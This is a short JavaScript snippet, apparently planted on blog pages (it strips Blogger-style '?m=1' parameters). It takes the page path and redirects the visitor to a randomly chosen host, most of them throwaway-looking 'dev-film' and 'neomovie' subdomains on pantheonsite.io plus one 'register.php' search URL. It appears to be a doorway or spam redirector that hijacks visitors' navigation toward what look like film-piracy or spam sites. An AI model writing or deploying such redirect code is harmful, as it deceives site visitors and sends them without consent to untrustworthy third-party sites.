var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = [
"https://dev-filmk32hd.pantheonsite.io",
"https://dev-filmfj.pantheonsite.io/",
"https://dev-neomoviefj.pantheonsite.io/",
"https://dev-neofilmfj.pantheonsite.io/",
"https://dev-filmflixss.pantheonsite.io/",
"https://dev-neoflimfj.pantheonsite.io/",
"https://dev-filmk32.pantheonsite.io/",
 "https://bo.1st.yt/register.php?do=search&q=",
"https://dev-filmk21.pantheonsite.io"
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
